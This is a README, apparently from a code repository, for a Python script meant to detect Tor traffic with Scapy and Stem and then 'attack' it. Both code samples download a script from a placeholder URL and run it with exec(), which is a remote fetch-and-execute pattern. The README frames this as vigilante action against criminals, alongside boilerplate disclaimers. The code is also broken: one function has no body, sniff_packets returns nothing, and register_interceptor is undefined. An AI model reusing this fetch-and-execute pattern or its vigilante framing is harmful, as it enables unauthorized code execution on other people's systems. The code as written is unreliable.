# Tor Traffic Monitoring Script

This script monitors and intercepts Tor traffic to detect and handle malicious activity. It utilizes the Scapy and Stem libraries to analyze network packets and interact with the Tor network.

## Features

- Monitors and intercepts Tor traffic in real-time.
- Detects malicious traffic based on specified keywords.
- Executes an external script for further analysis or actions like attacks
- Excludes malicious Tor relays from the circuit.

## Prerequisites

- Python 3.x
- Scapy library (`pip install scapy`)
- Stem library (`pip install stem`)

## Usage

1. Set the desired `.onion` address to monitor in the `onion_address` variable.
2. Customize the keywords for detecting malicious traffic in the `MaliciousTrafficListener` class.
3. Run the script and observe the output for detected malicious traffic.
4. Customize the `intercept_api_requests` function to handle intercepted API requests.
5. Adjust the local address or URL of the external script as needed.
6. Execute the `exclude_malicious_relays` function to add malicious relays to the circuit blacklist.

## Important Note

Executing code fetched from the internet or local sources can be risky. 
Ensure that you trust the source and contents of the external script before loading and executing it.

A creative small Python script that intercepts API requests and, when accessed through the Tor network, loads and runs an external script from a specified URL to Fuck them!
However, keep in mind that this is a highly risky and potentially illegal activity. Use at your own risk and only against crime and child abuse!
## Sorry cant explane all or you know what can be!

## WARNING: READ CAREFULLY! !!! DANGER !!!
This Black Python script example is intended for use by security professionals and developers only. It is not intended for malicious purposes, and I cannot be held responsible for any misuse of this code. If you use this tool for illegal or unethical purposes, you alone will be held responsible for any consequences that may arise, including legal and ethical issues.

### Be aware that attempting to bypass security measures is likely illegal and unethical!
Idea:
```python
import requests

def intercept_api_requests(request):
    if check_if_accessed_over_tor(request):
        external_script_url = "https://example.com/external_script.py"
        response = requests.get(external_script_url)
        if response.status_code == 200:
            exec(response.text)
        else:
            print("Failed to load the external script.")

def check_if_accessed_over_tor(request):
    # Implement your logic to detect if the request is coming from the Tor network
    # This might involve inspecting the request headers or analyzing network traffic

# Register the interceptor function to intercept API requests
register_interceptor(intercept_api_requests)
```


Example:
```python
from scapy.all import *
from stem import Signal
from stem.control import Controller
import requests

def check_if_tor_traffic(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 443:
        with Controller.from_port(port = 9051) as controller:
            controller.authenticate()
            if controller.get_info("address") == packet[IP].dst:
                return True
    return False

def sniff_packets():
    packets = sniff(filter="tcp and (port 9050 or port 9051)", prn=check_if_tor_traffic)

def intercept_api_requests(request):
    if sniff_packets():
        # This is where you would load and execute your external script.
        # Remember that executing code fetched from the internet can be risky.
        external_script_url = "https://example.com/external_script.py"
        response = requests.get(external_script_url)
        if response.status_code == 200:
            exec(response.text)
        else:
            print("Failed to load the external script.")
```
